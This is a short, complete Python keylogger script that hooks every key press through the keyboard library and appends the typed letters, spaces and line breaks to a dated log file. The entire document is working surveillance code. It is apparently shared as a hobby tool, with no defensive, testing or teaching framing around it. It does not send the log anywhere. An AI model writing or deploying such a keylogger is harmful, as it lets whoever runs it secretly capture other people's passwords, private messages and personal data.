#|-----------------------------|
import keyboard as k
from datetime import date
import time
import os
from random import randint
#|-----------------------------|
#create a filename with the date as the name and the extension on .txt
filename = f"keylog_{date.today()}.txt"
#if the file already exists, add a random number to the name
if os.path.exists(f"logs/{filename}"):
    filename = f"keylog_{date.today()}_{randint(0,999)}.txt"
#function to write the key pressed to the file
def on_key_press(event):
    with open(f'logs/{filename}', 'a') as f:
        #check the lenght of the event name
        letter = len(event.name)
        #check if the event is a letter
        if letter == 1:
             #if it is a letter than it will write on the file
             f.write('{}'.format(event.name))
        #if it's bigger then 1, than is not a letter, it is other tipe of keyboard entry (like: 'enter','backspace','tab' etc...)
        elif event.name == 'space': #if it is the event 'space' than add a space to the file
            f.write(' ')
        elif event.name == 'enter': #if it is the event 'enter' than add a new line to the file
            f.write('\n')
        else: #if it is not a letter nor any type like the above, just ignore
            pass
k.on_press(on_key_press) #run the function on a key press event
k.wait() #wait for the key press event

#|-----------------------------------------------------------|
#author: ConfettiOnTheWall